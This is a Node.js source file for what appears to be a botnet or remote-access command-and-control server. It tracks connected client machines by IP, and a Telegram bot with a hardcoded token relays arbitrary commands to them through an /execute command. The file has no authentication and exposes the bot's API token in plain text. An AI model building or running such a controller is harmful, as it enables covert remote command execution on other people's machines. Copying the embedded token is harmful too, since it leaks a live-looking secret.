const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const bot = new TelegramBot('7217930938:AAGPPM3htBdU1d-dui-wh4bWpVTzWqasE-k', { polling: true });

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

const clients = {};
let clientIdCounter = 0; // Счетчик для уникальных имен клиентов

io.on('connection', (socket) => {
    console.log('New client connected');

    const ip = socket.handshake.address;
    const formattedIp = ip.startsWith('::ffff:') ? ip.replace('::ffff:', '') : ip;

    socket.on('register', (data) => {
        const existingClient = Object.values(clients).find(client => client.ip === formattedIp);
        if (!existingClient) {
            const clientName = clientIdCounter++;
            clients[socket.id] = { ip: formattedIp, name: clientName };
            console.log(clients);
            io.emit('updateClients', clients);
        } else {
            console.log(`Client with IP ${formattedIp} already exists.`);
        }
    });

    socket.on('disconnect', () => {
        console.log('Client disconnected');
        delete clients[socket.id];
        io.emit('updateClients', clients);
    });

    socket.on('execute', ({ command, targetClientId }) => {
        if (clients[targetClientId]) {
            io.to(targetClientId).emit('executeCommand', command);
        }
    });
});

app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

server.listen(3000, () => {
    console.log('Server is running on port 3000');
});

// Обработка команд Telegram
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Welcome to the remote control bot. Use /clients to see the list of clients.');
});

bot.onText(/\/clients/, (msg) => {
    const chatId = msg.chat.id;
    const clientList = Object.values(clients).map(client => `${client.name} (${client.ip})`).join('\n');
    bot.sendMessage(chatId, clientList || 'No clients connected.');
});

bot.onText(/\/execute (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const command = match[1];
    const targetClientName = match[2];
    const targetClient = Object.values(clients).find(client => client.name == targetClientName);

    if (targetClient) {
        const targetClientId = Object.keys(clients).find(key => clients[key].name == targetClientName);
        io.to(targetClientId).emit('executeCommand', command);
        bot.sendMessage(chatId, `Command "${command}" sent to ${targetClientName}.`);
    } else {
        bot.sendMessage(chatId, `Client "${targetClientName}" not found.`);
    }
});
